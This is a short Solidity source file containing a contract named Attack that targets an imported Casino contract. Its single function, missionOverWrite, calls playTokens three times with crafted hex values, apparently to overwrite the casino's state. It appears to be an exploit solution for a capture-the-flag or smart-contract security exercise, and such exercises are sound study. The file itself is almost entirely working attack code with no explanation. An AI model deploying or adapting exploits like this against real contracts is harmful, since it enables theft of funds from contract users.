// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

import "./Casino.sol";

contract Attack
{
    Casino target;

    constructor(address _target)
    {
        target = Casino(_target);
    }

    function missionOverWrite() public
    {
        target.playTokens(0xfd48b1cf88b15bdd, 0, 0, 0x2b74e30774ea423);
        target.playTokens(0, 0x5f54b6656fc56e05, 0, 0xa0ab499a903a91fb);
        target.playTokens(0, 0, 0x7746d726, 0xffffffff88b928da);
    }
}